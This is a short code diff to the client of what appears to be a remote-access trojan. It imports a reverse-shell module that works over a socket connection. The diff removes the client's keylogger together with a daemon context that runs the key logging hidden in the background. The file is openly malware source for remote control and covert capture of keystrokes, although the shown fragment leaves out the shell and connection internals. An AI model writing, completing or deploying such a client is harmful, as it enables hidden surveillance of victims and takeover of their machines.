@@ -1,6 +1,5 @@
 from connection import Connection
 from rev_shell import Shell
-from keylogger import Keylogger
 import time
 import socket
 import daemon
@@ -36,9 +35,6 @@ class Client:
         # Create shell instance
         self.shell = Shell(self.sock)
 
-        # Create keylogger instance
-        self.keylogger = Keylogger(filename)
-
     def run(self) -> None:
         """
         Creates a connection between server and client.
@@ -58,11 +54,7 @@ class Client:
 
         # --------------------------KEYLOGGER--------------------------#
 
-        # Start handler and make the proccess hidden
-        with daemon.DaemonContext(files_preserve=[logging.getLogger().handlers[0].stream]):
-            # Start keylogger
-            self.keylogger.setup()
-            self.keylogger.start_logging()
+        
 
         # --------------------------------------------------------------#
 
